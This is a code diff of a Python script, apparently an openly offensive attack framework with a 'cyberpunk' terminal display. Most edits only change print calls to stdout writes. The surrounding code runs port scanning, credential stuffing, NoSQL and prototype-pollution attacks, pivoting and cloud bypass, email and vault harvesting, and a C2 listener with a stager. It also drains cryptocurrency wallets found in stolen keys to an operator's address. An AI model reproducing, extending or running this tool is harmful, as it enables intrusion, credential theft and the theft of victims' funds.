@@ -44,7 +44,7 @@ BANNER = f"""{MATRIX_GREEN}{BOLD}
 """
 
 def cyber_print(text, delay=0.01, color=MATRIX_GREEN):
-    """Types text out smoothly with automated terminal scrolling."""
+    """Types text out smoothly with automated terminal scrolling via sys.stdout."""
     for char in text:
         sys.stdout.write(f"{color}{char}{RESET}")
         sys.stdout.flush()
@@ -58,16 +58,20 @@ def validate_target_host(target_domain):
     Pre-flight DNS & reachability check to prevent blind execution 
     against dead domains or invalid wildcard resolutions.
     """
-    print(f"\n{CYAN}[PRE-FLIGHT] → Resolving target domain: {target_domain}{RESET}")
+    sys.stdout.write(f"\n{CYAN}[PRE-FLIGHT] → Resolving target domain: {target_domain}{RESET}\n")
+    sys.stdout.flush()
     try:
         ip = socket.gethostbyname(target_domain)
         if ip in ["0.0.0.0"] and "localhost" not in target_domain:
-            print(f"       └── {RED}[!] FATAL: Target resolved to unroutable IP ({ip}). Aborting pipeline.{RESET}")
+            sys.stdout.write(f"       └── {RED}[!] FATAL: Target resolved to unroutable IP ({ip}). Aborting pipeline.{RESET}\n")
+            sys.stdout.flush()
             return False, ip
-        print(f"       └── {GREEN}[SUCCESS] Target verified -> Resolved IP: {ip}{RESET}")
+        sys.stdout.write(f"       └── {GREEN}[SUCCESS] Target verified -> Resolved IP: {ip}{RESET}\n")
+        sys.stdout.flush()
         return True, ip
     except socket.gaierror as e:
-        print(f"       └── {RED}[!] DNS RESOLUTION ERROR: Could not resolve '{target_domain}': {e}{RESET}")
+        sys.stdout.write(f"       └── {RED}[!] DNS RESOLUTION ERROR: Could not resolve '{target_domain}': {e}{RESET}\n")
+        sys.stdout.flush()
         return False, None
 
 def spawn_c2_listener():
@@ -77,9 +81,11 @@ def spawn_c2_listener():
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind(("127.0.0.1", 4444))
         s.listen(1)
-        print(f"\n{GREEN}[*] C2 Listener armed on 127.0.0.1:4444 (Waiting for stager callback)...{RESET}")
+        sys.stdout.write(f"\n{GREEN}[*] C2 Listener armed on 127.0.0.1:4444 (Waiting for stager callback)...{RESET}\n")
+        sys.stdout.flush()
         conn, addr = s.accept()
-        print(f"\n{GREEN}{BOLD}[+++] C2 HANDSHAKE CAUGHT FROM: {addr}{RESET}")
+        sys.stdout.write(f"\n{GREEN}{BOLD}[+++] C2 HANDSHAKE CAUGHT FROM: {addr}{RESET}\n")
+        sys.stdout.flush()
         while True:
             data = conn.recv(4096)
             if not data:
@@ -88,7 +94,8 @@ def spawn_c2_listener():
             sys.stdout.flush()
         conn.close()
     except Exception as e:
-        print(f"{RED}[!] C2 Listener exception: {e}{RESET}")
+        sys.stdout.write(f"{RED}[!] C2 Listener exception: {e}{RESET}\n")
+        sys.stdout.flush()
 
 async def async_main():
     sys.stdout.write("\033[2J\033[H")
@@ -115,8 +122,9 @@ async def async_main():
         sys.exit(1)
 
     # Clean block-tree structured output for target isolation
-    print(f"\n{CYAN}[TARGET 1/1] → https://{target} ({resolved_ip}){RESET}")
-    print(f"       └── [STATUS] Target isolated and locked successfully.")
+    sys.stdout.write(f"\n{CYAN}[TARGET 1/1] → https://{target} ({resolved_ip}){RESET}\n")
+    sys.stdout.write(f"       └── [STATUS] Target isolated and locked successfully.\n")
+    sys.stdout.flush()
     
     cyber_print(f"{YELLOW}[INIT] Loading offensive wordlist dictionaries...{RESET}", 0.005)
     try:
@@ -125,40 +133,49 @@ async def async_main():
         cyber_print(f"{RED}[ERROR] Wordlist mount failed: {e}{RESET}", 0.01)
         sys.exit(1)
 
-    print(f"       └── [SUCCESS] Wordlist Secured : {len(passwords)} candidate vectors loaded.")
+    sys.stdout.write(f"       └── [SUCCESS] Wordlist Secured : {len(passwords)} candidate vectors loaded.\n")
+    sys.stdout.flush()
 
     # Step 1: High-Speed Port Scanning & Service Profiling
-    print(f"\n{CYAN}[RECON 1/3] → Executing Asynchronous Port Profiler{RESET}")
+    sys.stdout.write(f"\n{CYAN}[RECON 1/3] → Executing Asynchronous Port Profiler{RESET}\n")
+    sys.stdout.flush()
     try:
         await run_port_scanner(target)
     except Exception as e:
-        print(f"       └── [!] Notice during port scan: {e}")
+        sys.stdout.write(f"       └── [!] Notice during port scan: {e}\n")
+        sys.stdout.flush()
 
     # Step 2: Real-time DOM Inspection, Security Header Audit & File Credential Queueing
-    print(f"\n{CYAN}[RECON 2/3] → Executing DOM & Header Intelligence Scan{RESET}")
+    sys.stdout.write(f"\n{CYAN}[RECON 2/3] → Executing DOM & Header Intelligence Scan{RESET}\n")
+    sys.stdout.flush()
     try:
         await parse_target_source(target)
     except Exception as e:
-        print(f"       └── [!] Notice during DOM parse: {e}")
+        sys.stdout.write(f"       └── [!] Notice during DOM parse: {e}\n")
+        sys.stdout.flush()
 
-    # Step 2.1: Active Multi-Protocol Assault Engine (Weaponizing Harvested RDP/WP/FTP Queues)
-    print(f"\n{CYAN}[ASSAULT] → Launching Active Multi-Protocol Assault Engine{RESET}")
+    # Step 2.1: Active Multi-Protocol Assault Engine
+    sys.stdout.write(f"\n{CYAN}[ASSAULT] → Launching Active Multi-Protocol Assault Engine{RESET}\n")
+    sys.stdout.flush()
     try:
         await execute_active_assault_engine(target)
     except Exception as e:
-        print(f"       └── [!] Notice during active assault dispatch: {e}")
+        sys.stdout.write(f"       └── [!] Notice during active assault dispatch: {e}\n")
+        sys.stdout.flush()
 
     # Step 2.5: Behavioral Evasion & Stealth Jitter Wrapper
-    print(f"\n{CYAN}[RECON 3/3] → Engaging Stealth Telemetry & Behavioral Jitter{RESET}")
+    sys.stdout.write(f"\n{CYAN}[RECON 3/3] → Engaging Stealth Telemetry & Behavioral Jitter{RESET}\n")
+    sys.stdout.flush()
     try:
         await run_stealth_engine(target, paths_to_probe=["/", "/login", "/api/health"])
     except Exception as e:
-        print(f"       └── [!] Notice during stealth probing: {e}")
+        sys.stdout.write(f"       └── [!] Notice during stealth probing: {e}\n")
+        sys.stdout.flush()
 
     # Step 3: Launch Heavy Autonomous Engine (Stateful Differential Analysis & Credential Stuffing)
     hits, duration = await run_autonomous_engine(target, passwords)
 
-    # Step 4: NoSQL Injection & Prototype Pollution Suite (If primary engine needs deep API mutation)
+    # Step 4: NoSQL Injection & Prototype Pollution Suite
     if not hits:
         cyber_print(f"{YELLOW}[*] Primary perimeter held. Deploying NoSQL & Prototype Pollution vectors...{RESET}", 0.005)
         pollution_hits = await test_nosql_and_pollution(target)
@@ -171,12 +188,14 @@ async def async_main():
         await replay_and_inject_payloads(target)
 
     # Step 4.5: Post-Exploitation Pivot & Cloud Control-Plane Bypass Suite
-    print(f"\n{CYAN}[PIVOT] → Initializing Autonomous Post-Exploitation & Cloud Control-Plane Suite{RESET}")
+    sys.stdout.write(f"\n{CYAN}[PIVOT] → Initializing Autonomous Post-Exploitation & Cloud Control-Plane Suite{RESET}\n")
+    sys.stdout.flush()
     try:
         await run_pivot_engine(target)
         await run_cloud_apex_suite(target)
     except Exception as e:
-        print(f"       └── [!] Notice during pivot execution: {e}")
+        sys.stdout.write(f"       └── [!] Notice during pivot execution: {e}\n")
+        sys.stdout.flush()
 
     # Step 5: Post-Exploitation, Vault Scraping, Crypto Wallet & Asset Auditing
     cyber_print(f"\n{MATRIX_GREEN}[+] Initiating post-exploitation asset harvesting & multi-chain audit...{RESET}", 0.005)
@@ -193,21 +212,23 @@ async def async_main():
         key_type = key.get("type")
         source_file = key.get("source")
         
-        print(f"\n{CYAN}[TARGET {idx}/{total_artifacts}] → {source_file}{RESET}")
-        print(f"       └── [AUDIT] Inspecting artifact type: {key_type}")
-        print(f"       └── [DATA]  Key/Seed: {key_content[:18]}...")
+        sys.stdout.write(f"\n{CYAN}[TARGET {idx}/{total_artifacts}] → {source_file}{RESET}\n")
+        sys.stdout.write(f"       └── [AUDIT] Inspecting artifact type: {key_type}\n")
+        sys.stdout.write(f"       └── [DATA]  Key/Seed: {key_content[:18]}...\n")
+        sys.stdout.flush()
         
         try:
             total_bal, drained, tx, chain_breakdown, operator_dest = check_and_drain_wallet(key_content)
-            print(f"       └── [SUCCESS] Multi-Chain Balance Audited:")
-            print(f"           ├── ETH/EVM : {chain_breakdown['evm']} ETH")
-            print(f"           ├── SOL     : {chain_breakdown['sol']} SOL")
-            print(f"           ├── BTC     : {chain_breakdown['btc']} BTC")
-            print(f"           ├── LTC     : {chain_breakdown['ltc']} LTC")
-            print(f"           ├── XRP     : {chain_breakdown['xrp']} XRP")
-            print(f"           └── TRON    : {chain_breakdown['tron']} TRX")
-            print(f"       └── [ROUTING] Operator Destination: {operator_dest[:12]}...{operator_dest[-6:]}")
-            print(f"       └── [SWEEP STATUS] Drained: {drained} | TxHash: {tx[:16]}...")
+            sys.stdout.write(f"       └── [SUCCESS] Multi-Chain Balance Audited:\n")
+            sys.stdout.write(f"           ├── ETH/EVM : {chain_breakdown['evm']} ETH\n")
+            sys.stdout.write(f"           ├── SOL     : {chain_breakdown['sol']} SOL\n")
+            sys.stdout.write(f"           ├── BTC     : {chain_breakdown['btc']} BTC\n")
+            sys.stdout.write(f"           ├── LTC     : {chain_breakdown['ltc']} LTC\n")
+            sys.stdout.write(f"           ├── XRP     : {chain_breakdown['xrp']} XRP\n")
+            sys.stdout.write(f"           └── TRON    : {chain_breakdown['tron']} TRX\n")
+            sys.stdout.write(f"       └── [ROUTING] Operator Destination: {operator_dest[:12]}...{operator_dest[-6:]}\n")
+            sys.stdout.write(f"       └── [SWEEP STATUS] Drained: {drained} | TxHash: {tx[:16]}...\n")
+            sys.stdout.flush()
             
             drain_results.append({
                 "type": key_type,
@@ -219,13 +240,15 @@ async def async_main():
                 "tx": tx
             })
         except Exception as e:
-            print(f"       └── [!] Multi-chain asset audit error: {e}")
+            sys.stdout.write(f"       └── [!] Multi-chain asset audit error: {e}\n")
+            sys.stdout.flush()
 
-    # 3. Properly Awaited Email Intelligence, Vault Scraping & Alerts
+    # 3. Properly Awaited Email Intelligence, Vault Scraping & Live Terminal Alerts
     try:
         await harvest_email_intelligence(target, verified_hits=hits)
     except Exception as e:
-        print(f"       └── [!] Intelligence harvest notice: {e}")
+        sys.stdout.write(f"       └── [!] Intelligence harvest notice: {e}\n")
+        sys.stdout.flush()
 
     for hit in hits:
         try:
@@ -237,14 +260,13 @@ async def async_main():
     try:
         listener_thread = threading.Thread(target=spawn_c2_listener, daemon=True)
         listener_thread.start()
-        time.sleep(0.5) # Brief pause to let socket bind
+        time.sleep(0.5)
         
         deploy_c2_stager("127.0.0.1", 4444)
-        
-        # Wait a moment for connection stream
         listener_thread.join(timeout=3)
     except Exception as e:
-        print(f"       └── [!] C2 deployment notice: {e}")
+        sys.stdout.write(f"       └── [!] C2 deployment notice: {e}\n")
+        sys.stdout.flush()
 
     # Cyberpunk Completion Dashboard
     cyber_print(f"\n{NEON_BLUE}═════════════════════════════════════════════════════════════{RESET}", 0.003)
@@ -256,7 +278,7 @@ async def async_main():
             cyber_print(f" ├── Vector [{idx}]: Endpoint {hit.get('endpoint')} | Type: {hit.get('type')}", 0.005)
             cyber_print(f" │    Status: {hit.get('status')} | Cookies: {hit.get('cookies')[:30]}...{RESET}", 0.005)
     else:
-        cyber_print(f"{YELLOW}[---] Adaptive engagement concluded. Harvest reports compiled in plaintext.{RESET}", 0.005)
+        cyber_print(f"{YELLOW}[---] Adaptive engagement concluded. Harvest streamed live in terminal.{RESET}", 0.005)
     
     cyber_print(f"{NEON_BLUE}═════════════════════════════════════════════════════════════{RESET}\n", 0.003)
 
